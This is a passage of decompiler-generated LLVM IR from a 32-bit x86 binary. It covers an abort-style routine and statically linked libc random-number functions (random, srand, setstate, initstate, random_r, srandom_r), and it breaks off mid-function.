dec_label_pc_804ae73:                             ; preds = %dec_label_pc_804aeda, %dec_label_pc_804ae6c
  %v1_804ae7b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  store i32 %v1_804ae7b, i32* %eax.global-to-local, align 4
  %v1_804ae87 = call i32 @__raise(i32 6)
  store i32 %v1_804ae87, i32* %eax.global-to-local, align 4
  %v1_804ae93 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805205c.57 to i32))
  store i32 %v1_804ae93, i32* %eax.global-to-local, align 4
  %v0_804ae9b.pre = load i8, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804ae9b

dec_label_pc_804ae9b:                             ; preds = %dec_label_pc_804ae63, %dec_label_pc_804ae73
  %v2_804ae9b = phi i32 [ %v2_804ae9b4, %dec_label_pc_804ae63 ], [ %v1_804ae93, %dec_label_pc_804ae73 ]
  %v0_804ae9b = phi i8 [ %v0_804ae63, %dec_label_pc_804ae63 ], [ %v0_804ae9b.pre, %dec_label_pc_804ae73 ]
  %v1_804ae9b = zext i8 %v0_804ae9b to i32
  %v3_804ae9b = and i32 %v2_804ae9b, -256
  %v4_804ae9b = or i32 %v1_804ae9b, %v3_804ae9b
  store i32 %v4_804ae9b, i32* %eax.global-to-local, align 4
  %v10_804aea0 = icmp eq i8 %v0_804ae9b, 1
  %v1_804aea2 = icmp eq i1 %v10_804aea0, false
  br i1 %v1_804aea2, label %dec_label_pc_804aefc, label %dec_label_pc_804aea4

dec_label_pc_804aea4:                             ; preds = %dec_label_pc_804ae9b
  store i8 2, i8* @global_var_8052500.58, align 256
  %v2_804aeb3 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_804aeb3, i32* %eax.global-to-local, align 4
  %v3_804aeb8 = bitcast i32* %stack_var_-272 to i8*
  %v4_804aeb8 = call i32 @__GI_memset(i8* %v3_804aeb8, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804aecf

dec_label_pc_804aecf:                             ; preds = %dec_label_pc_804aecf.dec_label_pc_804aecf_crit_edge, %dec_label_pc_804aea4
  %v0_804aecf = phi i32 [ %v12_804ae2a, %dec_label_pc_804aea4 ], [ %v0_804aecf.pre, %dec_label_pc_804aecf.dec_label_pc_804aecf_crit_edge ]
  %v1_804aed721 = phi i32 [ 31, %dec_label_pc_804aea4 ], [ %v1_804aed7, %dec_label_pc_804aecf.dec_label_pc_804aecf_crit_edge ]
  %v2_804aecf = mul i32 %v1_804aed721, 4
  %v3_804aecf = add i32 %v2_804aecf, 16
  %v4_804aecf = add i32 %v3_804aecf, %v0_804aecf
  %v5_804aecf = inttoptr i32 %v4_804aecf to i32*
  store i32 -1, i32* %v5_804aecf, align 4
  %v0_804aed7.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_804aed7 = add i32 %v0_804aed7.pre, -1
  %v9_804aed7 = icmp slt i32 %v1_804aed7, 0
  store i32 %v1_804aed7, i32* %eax.global-to-local, align 4
  %v1_804aed8 = icmp eq i1 %v9_804aed7, false
  br i1 %v1_804aed8, label %dec_label_pc_804aecf.dec_label_pc_804aecf_crit_edge, label %dec_label_pc_804aeda

dec_label_pc_804aecf.dec_label_pc_804aecf_crit_edge: ; preds = %dec_label_pc_804aecf
  %v0_804aecf.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804aecf

dec_label_pc_804aeda:                             ; preds = %dec_label_pc_804aecf
  store i32 %v2_804aeb3, i32* %eax.global-to-local, align 4
  %v4_804aeef = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_804aeef, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ae73

dec_label_pc_804aefc:                             ; preds = %dec_label_pc_804ae9b
  %v10_804aefc = icmp eq i8 %v0_804ae9b, 2
  %v1_804aefe = icmp eq i1 %v10_804aefc, false
  br i1 %v1_804aefe, label %dec_label_pc_804af08, label %dec_label_pc_804af08.thread

dec_label_pc_804af08.thread:                      ; preds = %dec_label_pc_804aefc
  store i8 3, i8* @global_var_8052500.58, align 256
  br label %dec_label_pc_804af11

dec_label_pc_804af08:                             ; preds = %dec_label_pc_804aefc
  %v9_804af08 = icmp eq i8 %v0_804ae9b, 3
  %v1_804af0f = icmp eq i1 %v9_804af08, false
  br i1 %v1_804af0f, label %dec_label_pc_804af22, label %dec_label_pc_804af11

dec_label_pc_804af11:                             ; preds = %dec_label_pc_804af08.thread, %dec_label_pc_804af08
  store i8 4, i8* @global_var_8052500.58, align 256
  %v1_804af1d = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_804af22:                             ; preds = %dec_label_pc_804af08, %dec_label_pc_804af22
  br label %dec_label_pc_804af22

; uselistorder directives
  uselistorder i32 %v1_804aed7, { 2, 1, 0 }
  uselistorder i32 %v1_804ae3a, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 1, 0 }
  uselistorder i8* @global_var_8052500.58, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804af22, { 1, 0 }
  uselistorder label %dec_label_pc_804af11, { 1, 0 }
  uselistorder label %dec_label_pc_804ae9b, { 1, 0 }
  uselistorder label %dec_label_pc_804ae63, { 1, 0 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v2_804af36 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804af36, i32* @ebx, align 4
  %v2_804af3b = call i32 @__pthread_return_void(i32 %v2_804af36, i32 134526427)
  %v1_804af47 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v2_804af4e = ptrtoint i32* %stack_var_-8 to i32
  %v3_804af58 = call i32 @__GI_random_r(i32* nonnull @global_var_805208c, i32 %v2_804af4e)
  store i32 ptrtoint (i32* @global_var_805208c to i32), i32* @eax, align 4
  %v2_804af62 = call i32 @__pthread_return_void(i32 %v2_804af36, i32 1)
  %v3_804af67 = load i32, i32* %stack_var_-8, align 4
  ret i32 %v3_804af67
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_804af81 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804af81, i32* @eax, align 4
  %v2_804af86 = call i32 @__pthread_return_void(i32 %v2_804af81, i32 134526427)
  %v1_804af92 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v0_804af9e = load i32, i32* bitcast (i32** @global_var_8052094.62 to i32*), align 4
  store i32 %v0_804af9e, i32* @ebx, align 4
  %v3_804afa8 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_805208c)
  %v2_804afb0 = icmp slt i32 %v3_804afa8, 0
  br i1 %v2_804afb0, label %dec_label_pc_804afb7, label %dec_label_pc_804afb4

dec_label_pc_804afb4:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_8052090.63 to i32), i32* @esi, align 4
  br label %dec_label_pc_804afb7

dec_label_pc_804afb7:                             ; preds = %entry, %dec_label_pc_804afb4
  store i32 %v2_804af81, i32* @eax, align 4
  %v2_804afc0 = call i32 @__pthread_return_void(i32 %v2_804af81, i32 1)
  %v0_804afc5 = load i32, i32* @esi, align 4
  ret i32 %v0_804afc5

; uselistorder directives
  uselistorder label %dec_label_pc_804afb7, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_804afdc = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_804afdc, i32* @ebx, align 4
  %v2_804afe1 = call i32 @__pthread_return_void(i32 %v2_804afdc, i32 134526427)
  %v1_804afed = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v0_804aff7 = load i32, i32* bitcast (i32** @global_var_8052094.62 to i32*), align 4
  store i32 %v0_804aff7, i32* @esi, align 4
  %v4_804b009 = inttoptr i32 %arg2 to i32*
  %v5_804b009 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_804b009, i32 %arg3, i32 ptrtoint (i32* @global_var_805208c to i32))
  store i32 %v5_804b009, i32* @eax, align 4
  %v2_804b014 = call i32 @__pthread_return_void(i32 %v2_804afdc, i32 1)
  ret i32 ptrtoint (i32** @global_var_8052090.63 to i32)
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b024 = load i32, i32* @ebx, align 4
  store i32 %v0_804b024, i32* %stack_var_-4, align 4
  %v2_804b032 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_804b032, i32* @ebx, align 4
  %v2_804b037 = call i32 @__pthread_return_void(i32 %v2_804b032, i32 134526427)
  %v1_804b043 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8052074.59 to i32))
  %v2_804b053 = sext i32 %arg1 to i64
  %v3_804b053 = call i32 @srandom_r(i64 %v2_804b053, i32 ptrtoint (i32* @global_var_805208c to i32))
  store i32 ptrtoint (i32* @global_var_805208c to i32), i32* @eax, align 4
  %v2_804b05d = call i32 @__pthread_return_void(i32 %v2_804b032, i32 1)
  %v2_804b065 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b065, i32* @ebx, align 4
  ret i32 %v2_804b05d

; uselistorder directives
  uselistorder i32* @global_var_805208c, { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_805208c to i32), { 1, 3, 2, 0 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = ptrtoint i32* %arg2 to i32
  %v0_804b06b = load i32, i32* @ebx, align 4
  store i32 %tmp4, i32* %ebx.global-to-local, align 4
  %v1_804b077 = add i32 %arg1, 4
  store i32 %v1_804b077, i32* %esi.global-to-local, align 4
  %v1_804b07a = add i32 %tmp4, 12
  %v2_804b07a = inttoptr i32 %v1_804b07a to i32*
  %v3_804b07a = load i32, i32* %v2_804b07a, align 4
  store i32 %v3_804b07a, i32* %ecx.global-to-local, align 4
  %v1_804b07d = add i32 %tmp4, 8
  %v2_804b07d = inttoptr i32 %v1_804b07d to i32*
  %v3_804b07d = load i32, i32* %v2_804b07d, align 4
  %v1_804b080 = icmp eq i32 %v3_804b07a, 0
  %v1_804b082 = icmp eq i1 %v1_804b080, false
  br i1 %v1_804b082, label %dec_label_pc_804b08d, label %dec_label_pc_804b084

dec_label_pc_804b084:                             ; preds = %entry
  %v1_804b084 = add i32 %v3_804b07d, -4
  %v2_804b084 = inttoptr i32 %v1_804b084 to i32*
  store i32 0, i32* %v2_804b084, align 4
  br label %dec_label_pc_804b09d

dec_label_pc_804b08d:                             ; preds = %entry
  %v1_804b08d = add i32 %tmp4, 4
  %v2_804b08d = inttoptr i32 %v1_804b08d to i32*
  %v3_804b08d = load i32, i32* %v2_804b08d, align 4
  %v2_804b090 = sub i32 %v3_804b08d, %v3_804b07d
  %v2_804b092 = sdiv i32 %v2_804b090, 4
  %v3_804b095 = mul i32 %v2_804b092, 5
  %v2_804b098 = add i32 %v3_804b095, %v3_804b07a
  store i32 %v2_804b098, i32* %eax.global-to-local, align 4
  %v2_804b09a = add i32 %v3_804b07d, -4
  %v3_804b09a = inttoptr i32 %v2_804b09a to i32*
  store i32 %v2_804b098, i32* %v3_804b09a, align 4
  br label %dec_label_pc_804b09d

dec_label_pc_804b09d:                             ; preds = %dec_label_pc_804b084, %dec_label_pc_804b08d
  %v0_804b09d = load i32, i32* %esi.global-to-local, align 4
  %v1_804b09d = add i32 %v0_804b09d, -4
  %v2_804b09d = inttoptr i32 %v1_804b09d to i32*
  %v3_804b09d = load i32, i32* %v2_804b09d, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_804b0a5 = ashr i32 %v3_804b09d, 31
  %v2_804b0a6 = zext i32 %v3_804b09d to i64
  %v4_804b0a6 = zext i32 %v1_804b0a5 to i64
  %v5_804b0a6 = mul nuw i64 %v4_804b0a6, 4294967296
  %v6_804b0a6 = or i64 %v5_804b0a6, %v2_804b0a6
  %v8_804b0a6 = sdiv i64 %v6_804b0a6, 5
  %v9_804b0a6 = trunc i64 %v8_804b0a6 to i32
  store i32 %v9_804b0a6, i32* %eax.global-to-local, align 4
  %v10_804b0a6 = srem i64 %v6_804b0a6, 5
  %v11_804b0a6 = trunc i64 %v10_804b0a6 to i32
  %v6_804b0ab = icmp ugt i32 %v11_804b0a6, 4
  br i1 %v6_804b0ab, label %dec_label_pc_804b0eb, label %dec_label_pc_804b0ad

dec_label_pc_804b0ad:                             ; preds = %dec_label_pc_804b09d
  %v1_804b0ad = mul i32 %v11_804b0a6, 4
  %v2_804b0ad = add i32 %v1_804b0ad, ptrtoint (i32* @global_var_8050354.64 to i32)
  %v3_804b0ad = inttoptr i32 %v2_804b0ad to i32*
  %v4_804b0ad = load i32, i32* %v3_804b0ad, align 4
  store i32 %v4_804b0ad, i32* %ecx.global-to-local, align 4
  %v2_804b0b4 = add i32 %v1_804b0ad, ptrtoint (i32* @global_var_8050340.65 to i32)
  %v3_804b0b4 = inttoptr i32 %v2_804b0b4 to i32*
  %v4_804b0b4 = load i32, i32* %v3_804b0b4, align 4
  store i32 %v4_804b0b4, i32* %ebp.global-to-local, align 4
  %v1_804b0bb = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0bb = add i32 %v1_804b0bb, 16
  %v3_804b0bb = inttoptr i32 %v2_804b0bb to i32*
  store i32 %v4_804b0ad, i32* %v3_804b0bb, align 4
  %v0_804b0be = load i32, i32* %ebp.global-to-local, align 4
  %v1_804b0be = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0be = add i32 %v1_804b0be, 20
  %v3_804b0be = inttoptr i32 %v2_804b0be to i32*
  store i32 %v0_804b0be, i32* %v3_804b0be, align 4
  %v1_804b0c1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0c1 = add i32 %v1_804b0c1, 12
  %v3_804b0c1 = inttoptr i32 %v2_804b0c1 to i32*
  store i32 %v11_804b0a6, i32* %v3_804b0c1, align 4
  %v1_804b0c4 = icmp eq i32 %v11_804b0a6, 0
  br i1 %v1_804b0c4, label %dec_label_pc_804b0de, label %dec_label_pc_804b0c8

dec_label_pc_804b0c8:                             ; preds = %dec_label_pc_804b0ad
  %v0_804b0c8 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b0c8 = add i32 %v0_804b0c8, -4
  %v2_804b0c8 = inttoptr i32 %v1_804b0c8 to i32*
  %v3_804b0c8 = load i32, i32* %v2_804b0c8, align 4
  %v1_804b0cb = ashr i32 %v3_804b0c8, 31
  %v0_804b0cc = load i32, i32* %edi.global-to-local, align 4
  %v2_804b0cc = zext i32 %v3_804b0c8 to i64
  %v4_804b0cc = zext i32 %v1_804b0cb to i64
  %v5_804b0cc = mul nuw i64 %v4_804b0cc, 4294967296
  %v6_804b0cc = or i64 %v5_804b0cc, %v2_804b0cc
  %v7_804b0cc = zext i32 %v0_804b0cc to i64
  %v8_804b0cc = sdiv i64 %v6_804b0cc, %v7_804b0cc
  %v9_804b0cc = trunc i64 %v8_804b0cc to i32
  %v2_804b0ce = mul i32 %v9_804b0cc, 4
  %v3_804b0ce = add i32 %v2_804b0ce, %v0_804b0c8
  %v1_804b0d1 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b0d1 = add i32 %v1_804b0d1, %v9_804b0cc
  store i32 %v2_804b0d1, i32* %eax.global-to-local, align 4
  %v1_804b0d3 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0d3 = add i32 %v1_804b0d3, 4
  %v3_804b0d3 = inttoptr i32 %v2_804b0d3 to i32*
  store i32 %v3_804b0ce, i32* %v3_804b0d3, align 4
  %v0_804b0d6 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b0d6 = ashr i32 %v0_804b0d6, 31
  %v0_804b0d7 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b0d7 = zext i32 %v0_804b0d6 to i64
  %v4_804b0d7 = zext i32 %v1_804b0d6 to i64
  %v5_804b0d7 = mul nuw i64 %v4_804b0d7, 4294967296
  %v6_804b0d7 = or i64 %v5_804b0d7, %v2_804b0d7
  %v7_804b0d7 = zext i32 %v0_804b0d7 to i64
  %v8_804b0d7 = sdiv i64 %v6_804b0d7, %v7_804b0d7
  %v9_804b0d7 = trunc i64 %v8_804b0d7 to i32
  store i32 %v9_804b0d7, i32* %eax.global-to-local, align 4
  %v10_804b0d7 = srem i64 %v6_804b0d7, %v7_804b0d7
  %v11_804b0d7 = trunc i64 %v10_804b0d7 to i32
  %v0_804b0d9 = load i32, i32* %esi.global-to-local, align 4
  %v2_804b0d9 = mul i32 %v11_804b0d7, 4
  %v3_804b0d9 = add i32 %v2_804b0d9, %v0_804b0d9
  %v1_804b0dc = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0dc = inttoptr i32 %v1_804b0dc to i32*
  store i32 %v3_804b0d9, i32* %v2_804b0dc, align 4
  br label %dec_label_pc_804b0de

dec_label_pc_804b0de:                             ; preds = %dec_label_pc_804b0ad, %dec_label_pc_804b0c8
  %v0_804b0de = load i32, i32* %esi.global-to-local, align 4
  %v1_804b0de = load i32, i32* %ecx.global-to-local, align 4
  %v2_804b0de = mul i32 %v1_804b0de, 4
  %v3_804b0de = add i32 %v2_804b0de, %v0_804b0de
  store i32 %v3_804b0de, i32* %eax.global-to-local, align 4
  %v1_804b0e1 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0e1 = add i32 %v1_804b0e1, 8
  %v3_804b0e1 = inttoptr i32 %v2_804b0e1 to i32*
  store i32 %v0_804b0de, i32* %v3_804b0e1, align 4
  %v0_804b0e4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b0e4 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b0e4 = add i32 %v1_804b0e4, 24
  %v3_804b0e4 = inttoptr i32 %v2_804b0e4 to i32*
  store i32 %v0_804b0e4, i32* %v3_804b0e4, align 4
  br label %dec_label_pc_804b0f9

dec_label_pc_804b0eb:                             ; preds = %dec_label_pc_804b09d
  %v1_804b0eb = call i32 @__errno_location(i32 %v0_804b06b)
  store i32 %v1_804b0eb, i32* %eax.global-to-local, align 4
  %v1_804b0f0 = inttoptr i32 %v1_804b0eb to i32*
  store i32 22, i32* %v1_804b0f0, align 4
  br label %dec_label_pc_804b0f9

dec_label_pc_804b0f9:                             ; preds = %dec_label_pc_804b0de, %dec_label_pc_804b0eb
  %storemerge = phi i32 [ -1, %dec_label_pc_804b0eb ], [ 0, %dec_label_pc_804b0de ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  store i32 %v0_804b06b, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_804b0de, { 1, 0 }
  uselistorder i32 %v11_804b0a6, { 2, 1, 3, 0 }
  uselistorder i32 %tmp4, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 5, 6, 0, 1, 2, 3, 4, 7, 8 }
  uselistorder i64 5, { 1, 0 }
  uselistorder label %dec_label_pc_804b0f9, { 1, 0 }
  uselistorder label %dec_label_pc_804b0de, { 1, 0 }
  uselistorder label %dec_label_pc_804b09d, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp2 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804b104 = load i32, i32* @ebx, align 4
  store i32 %v0_804b104, i32* %stack_var_-16, align 4
  store i32 %tmp2, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_804b10d = add i32 %tmp2, 8
  %v2_804b10d = inttoptr i32 %v1_804b10d to i32*
  %v3_804b10d = load i32, i32* %v2_804b10d, align 4
  store i32 %v3_804b10d, i32* %esi.global-to-local, align 4
  %v1_804b110 = add i32 %tmp2, 12
  %v2_804b110 = inttoptr i32 %v1_804b110 to i32*
  %v3_804b110 = load i32, i32* %v2_804b110, align 4
  %v4_804b110 = icmp eq i32 %v3_804b110, 0
  %v1_804b114 = icmp eq i1 %v4_804b110, false
  br i1 %v1_804b114, label %dec_label_pc_804b12d, label %dec_label_pc_804b116

dec_label_pc_804b116:                             ; preds = %entry
  %v2_804b116 = inttoptr i32 %v3_804b10d to i32*
  %v3_804b116 = load i32, i32* %v2_804b116, align 4
  %v5_804b116 = mul i32 %v3_804b116, 1103515245
  %v1_804b11c = add i32 %v5_804b116, 12345
  %v1_804b121 = urem i32 %v1_804b11c, -2147483648
  store i32 %v1_804b121, i32* %eax.global-to-local, align 4
  store i32 %v1_804b121, i32* %v2_804b116, align 4
  %v0_804b128 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b128 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b128 = inttoptr i32 %v1_804b128 to i32*
  store i32 %v0_804b128, i32* %v2_804b128, align 4
  br label %dec_label_pc_804b159

dec_label_pc_804b12d:                             ; preds = %entry
  %v1_804b12d = add i32 %tmp2, 4
  %v2_804b12d = inttoptr i32 %v1_804b12d to i32*
  %v3_804b12d = load i32, i32* %v2_804b12d, align 4
  store i32 %v3_804b12d, i32* %ecx.global-to-local, align 4
  %v2_804b130 = load i32, i32* %arg1, align 4
  store i32 %v2_804b130, i32* %edx.global-to-local, align 4
  %v1_804b132 = add i32 %tmp2, 24
  %v2_804b132 = inttoptr i32 %v1_804b132 to i32*
  %v3_804b132 = load i32, i32* %v2_804b132, align 4
  store i32 %v3_804b132, i32* %edi.global-to-local, align 4
  %v1_804b135 = inttoptr i32 %v3_804b12d to i32*
  %v2_804b135 = load i32, i32* %v1_804b135, align 4
  store i32 %v2_804b135, i32* %eax.global-to-local, align 4
  %v1_804b137 = inttoptr i32 %v2_804b130 to i32*
  %v2_804b137 = load i32, i32* %v1_804b137, align 4
  %v4_804b137 = add i32 %v2_804b137, %v2_804b135
  store i32 %v4_804b137, i32* %v1_804b137, align 4
  %v0_804b139 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b139 = inttoptr i32 %v0_804b139 to i32*
  %v2_804b139 = load i32, i32* %v1_804b139, align 4
  %v1_804b13b = add i32 %v0_804b139, 4
  store i32 %v1_804b13b, i32* %edx.global-to-local, align 4
  %v2_804b13e = udiv i32 %v2_804b139, 2
  %v1_804b140 = load i32, i32* %edi.global-to-local, align 4
  %v7_804b140 = icmp ult i32 %v1_804b13b, %v1_804b140
  %v1_804b142 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804b142 = inttoptr i32 %v1_804b142 to i32*
  store i32 %v2_804b13e, i32* %v2_804b142, align 4
  %v0_804b145 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804b145 = add i32 %v0_804b145, 4
  store i32 %v1_804b145, i32* %eax.global-to-local, align 4
  br i1 %v7_804b140, label %dec_label_pc_804b14e, label %dec_label_pc_804b14a

dec_label_pc_804b14a:                             ; preds = %dec_label_pc_804b12d
  %v0_804b14a = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804b14a, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804b154

dec_label_pc_804b14e:                             ; preds = %dec_label_pc_804b12d
  %v1_804b14e = load i32, i32* %edi.global-to-local, align 4
  %v7_804b14e = icmp ult i32 %v1_804b145, %v1_804b14e
  br i1 %v7_804b14e, label %dec_label_pc_804b154, label %dec_label_pc_804b152

dec_label_pc_804b152:                             ; preds = %dec_label_pc_804b14e
  %v0_804b152 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_804b152, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b154

dec_label_pc_804b154:                             ; preds = %dec_label_pc_804b14e, %dec_label_pc_804b14a, %dec_label_pc_804b152
  %v0_804b154 = load i32, i32* %edx.global-to-local, align 4
  %v1_804b154 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b154 = inttoptr i32 %v1_804b154 to i32*
  store i32 %v0_804b154, i32* %v2_804b154, align 4
  %v0_804b156 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b156 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804b156 = add i32 %v1_804b156, 4
  %v3_804b156 = inttoptr i32 %v2_804b156 to i32*
  store i32 %v0_804b156, i32* %v3_804b156, align 4
  br label %dec_label_pc_804b159

dec_label_pc_804b159:                             ; preds = %dec_label_pc_804b116, %dec_label_pc_804b154
  store i32 0, i32* %eax.global-to-local, align 4
  %v2_804b15b = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804b15b, i32* @ebx, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_804b121, { 1, 0 }
  uselistorder i32 %tmp2, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_804b159, { 1, 0 }
  uselistorder label %dec_label_pc_804b154, { 2, 0, 1 }
}

define i32 @srandom_r(i64 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_804b160 = load i32, i32* @ebp, align 4
  %v0_804b161 = load i32, i32* @edi, align 4
  %v0_804b162 = load i32, i32* @esi, align 4
  %v0_804b163 = load i32, i32* @ebx, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  store i32 %arg2, i32* @esi, align 4
  %v4_804b16e = trunc i64 %arg1 to i32
  store i32 %v4_804b16e, i32* %eax.global-to-local, align 4
  %v1_804b172 = add i32 %arg2, 12
  %v2_804b172 = inttoptr i32 %v1_804b172 to i32*
  %v3_804b172 = load i32, i32* %v2_804b172, align 4
  store i32 %v3_804b172, i32* %edx.global-to-local, align 4
  %v6_804b178 = icmp ugt i32 %v3_804b172, 4
  br i1 %v6_804b178, label %dec_label_pc_804b1ec, label %dec_label_pc_804b17a

dec_label_pc_804b17a:                             ; preds = %entry
  %v1_804b17a = add i32 %arg2, 8
  %v2_804b17a = inttoptr i32 %v1_804b17a to i32*
  %v3_804b17a = load i32, i32* %v2_804b17a, align 4
  store i32 %v3_804b17a, i32* %ebx.global-to-local, align 4
  %v1_804b17d = icmp eq i32 %v4_804b16e, 0
  %v1_804b17f = icmp eq i1 %v1_804b17d, false
  br i1 %v1_804b17f, label %dec_label_pc_804b183, label %dec_label_pc_804b181

dec_label_pc_804b181:                             ; preds = %dec_label_pc_804b17a
  %v1_804b181 = and i32 %v4_804b16e, -256
  %v2_804b181 = or i32 %v1_804b181, 1
  store i32 %v2_804b181, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b183

dec_label_pc_804b183:                             ; preds = %dec_label_pc_804b17a, %dec_label_pc_804b181
  %v0_804b183 = phi i32 [ %v4_804b16e, %dec_label_pc_804b17a ], [ %v2_804b181, %dec_label_pc_804b181 ]
  %v2_804b183 = inttoptr i32 %v3_804b17a to i32*
  store i32 %v0_804b183, i32* %v2_804b183, align 4
  %v1_804b185 = icmp eq i32 %v3_804b172, 0
  br i1 %v1_804b185, label %dec_label_pc_804b1ea, label %dec_label_pc_804b189

dec_label_pc_804b189:                             ; preds = %dec_label_pc_804b183
  %v0_804b189 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_804b189, i32* %edx.global-to-local, align 4
  %v0_804b18b = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_804b18b, i32* %ecx.global-to-local, align 4
  %v0_804b18d = load i32, i32* @esi, align 4
  %v1_804b18d = add i32 %v0_804b18d, 16
  %v2_804b18d = inttoptr i32 %v1_804b18d to i32*
  %v3_804b18d = load i32, i32* %v2_804b18d, align 4
  store i32 %v3_804b18d, i32* %eax.global-to-local, align 4
  %v4_804b195 = sext i32 %v3_804b18d to i64
  store i64 %v4_804b195, i64* %stack_var_-40, align 8
  %v5_804b1c727 = icmp sgt i32 %v3_804b18d, 1
  br i1 %v5_804b1c727, label %dec_label_pc_804b19a, label %dec_label_pc_804b1c9

dec_label_pc_804b19a:                             ; preds = %dec_label_pc_804b189, %dec_label_pc_804b19a.dec_label_pc_804b19a_crit_edge
  %v0_804b1be = phi i32 [ %v0_804b1be.pre, %dec_label_pc_804b19a.dec_label_pc_804b19a_crit_edge ], [ %v0_804b18b, %dec_label_pc_804b189 ]
  %v0_804b19a = phi i32 [ %v0_804b19a.pre, %dec_label_pc_804b19a.dec_label_pc_804b19a_crit_edge ], [ %v0_804b189, %dec_label_pc_804b189 ]
